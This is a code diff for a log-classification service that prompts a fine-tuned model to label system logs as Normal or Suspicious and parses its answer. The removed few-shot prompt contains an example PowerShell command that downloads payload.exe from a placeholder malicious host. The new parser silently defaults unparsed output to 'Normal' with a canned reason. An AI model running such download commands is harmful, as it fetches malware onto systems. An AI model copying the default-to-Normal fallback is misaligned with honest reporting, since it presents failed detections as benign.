@@ -84,46 +84,48 @@ class MLService:
     
     def _format_prompt(self, log_input: str) -> str:
         """
-        Format logs into few-shot prompt matching training format.
+        Format logs using chat template matching EXACT training format.
         
         Args:
             log_input: Raw log content (JSON string)
             
         Returns:
-            Formatted prompt string
+            Formatted prompt string with chat template
         """
         # Truncate if too long
         if len(log_input) > settings.MAX_INPUT_CHARS:
             log_input = log_input[:settings.MAX_INPUT_CHARS] + "... [truncated]"
         
-        # Few-shot prompt matching training format
-        prompt = f"""You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.
-
-Output format:
-Status: Normal OR Status: Suspicious
-Reason: Brief explanation
-
-### Example 1:
-Input: {{"EventID": 4624, "LogonType": 2, "Account": "user@domain.com", "Workstation": "DESKTOP-123"}}
-Response:
-Status: Normal
-Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.
-
-### Example 2:
-Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\temp\\\\mal.exe", "User": "SYSTEM"}}
-Response:
-Status: Suspicious
-Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).
-
-### Now analyze this log:
-Input: {log_input}
-Response:
-"""
+        # EXACT instruction from training data
+        instruction = "Analyze this session log chunk and determine if it contains normal or suspicious activity. If suspicious, identify all MITRE ATT&CK techniques and explain why."
+        
+        # Combine instruction + input (matching training format)
+        user_message = f"{instruction}\n\n{log_input}"
+        
+        # Apply chat template (Qwen format)
+        messages = [
+            {"role": "user", "content": user_message}
+        ]
+        
+        # Use tokenizer's chat template
+        prompt = self.tokenizer.apply_chat_template(
+            messages,
+            tokenize=False,
+            add_generation_prompt=True
+        )
+        
         return prompt
     
     def _parse_output(self, output: str) -> Dict[str, any]:
         """
-        Parse model output to extract status, reason, and MITRE techniques.
+        Parse model output matching EXACT training format.
+        
+        Expected format:
+        Status: Normal
+        OR
+        Status: Suspicious
+        MITRE Techniques: T1234, T5678 (Description)
+        Reason: explanation
         
         Args:
             output: Raw model output
@@ -132,7 +134,7 @@ Response:
             Dictionary with parsed results
         """
         result = {
-            "status": "Unknown",
+            "status": "Normal",  # Default to Normal (most logs are normal)
             "reason": "",
             "mitre_techniques": [],
             "raw_output": output
@@ -140,53 +142,36 @@ Response:
         
         output_clean = output.strip()
         
-        # Parse status - exact training format
-        status_patterns = [
-            r'Status:\s*(Normal|Suspicious)',  # PRIMARY
-            r'status:\s*(normal|suspicious)',  # Lowercase
-        ]
+        # Parse status - EXACT training format: "Status: Normal" or "Status: Suspicious"
+        status_match = re.search(r'Status:\s*(Normal|Suspicious)', output_clean, re.IGNORECASE)
+        if status_match:
+            status_value = status_match.group(1).lower()
+            result["status"] = "Normal" if "normal" in status_value else "Suspicious"
         
-        for pattern in status_patterns:
-            match = re.search(pattern, output_clean, re.IGNORECASE)
-            if match:
-                matched = match.group(1).lower()
-                if "normal" in matched:
-                    result["status"] = "Normal"
-                elif "suspicious" in matched:
-                    result["status"] = "Suspicious"
-                else:
-                    result["status"] = match.group(1).capitalize()
-                break
-        
-        # Keyword fallback
-        if result["status"] == "Unknown":
-            lower = output_clean.lower()
-            suspicious_keywords = ['suspicious', 'attack', 'malicious', 'threat']
-            normal_keywords = ['normal', 'benign', 'legitimate']
-            
-            suspicious_count = sum(1 for kw in suspicious_keywords if kw in lower)
-            normal_count = sum(1 for kw in normal_keywords if kw in lower)
-            
-            if suspicious_count > normal_count and suspicious_count > 0:
+        # Extract MITRE Techniques line (only present for suspicious logs in training data)
+        # Format: "MITRE Techniques: T1234 (Name), T5678 (Name)"
+        mitre_line_match = re.search(r'MITRE Techniques?:\s*([^\n]+)', output_clean, re.IGNORECASE)
+        if mitre_line_match:
+            mitre_line = mitre_line_match.group(1)
+            # Extract all T#### patterns from the line
+            result["mitre_techniques"] = list(set(re.findall(r'T\d{4}(?:\.\d{3})?', mitre_line)))
+            # If we found MITRE techniques but status wasn't set, it must be suspicious
+            if result["mitre_techniques"] and result["status"] == "Normal":
                 result["status"] = "Suspicious"
-            elif normal_count > 0:
-                result["status"] = "Normal"
         
-        # Extract reason
-        reason_patterns = [
-            r'Reason:\s*([^\n]+)',  # PRIMARY
-            r'reason:\s*([^\n]+)',
-        ]
+        # Extract reason - comes after "Reason:" 
+        reason_match = re.search(r'Reason:\s*(.+)', output_clean, re.DOTALL | re.IGNORECASE)
+        if reason_match:
+            reason_text = reason_match.group(1).strip()
+            # Take everything up to end or next section
+            result["reason"] = reason_text[:500]
         
-        for pattern in reason_patterns:
-            match = re.search(pattern, output_clean, re.DOTALL | re.IGNORECASE)
-            if match:
-                result["reason"] = match.group(1).strip()[:500]
-                break
-        
-        # Extract MITRE techniques
-        mitre_pattern = r'T\d{4}(?:\.\d{3})?'
-        result["mitre_techniques"] = list(set(re.findall(mitre_pattern, output_clean)))
+        # Fallback: if we still don't have a reason, use some default text
+        if not result["reason"]:
+            if result["status"] == "Normal":
+                result["reason"] = "Standard system activity with no suspicious indicators"
+            else:
+                result["reason"] = "Suspicious activity detected"
         
         return result
     
@@ -223,16 +208,15 @@ Response:
             )
             inputs = {k: v.to(self.model.device) for k, v in inputs.items()}
             
-            # Generate
+            # Generate with greedy decoding for consistent classification
             logger.info("Generating prediction...")
             with torch.no_grad():
                 outputs = self.model.generate(
                     **inputs,
                     max_new_tokens=settings.MAX_NEW_TOKENS,
-                    temperature=settings.TEMPERATURE,
-                    do_sample=True,
-                    top_p=settings.TOP_P,
-                    pad_token_id=self.tokenizer.eos_token_id
+                    do_sample=False,  # Greedy decoding for classification
+                    pad_token_id=self.tokenizer.eos_token_id,
+                    eos_token_id=self.tokenizer.eos_token_id
                 )
             
             # Decode
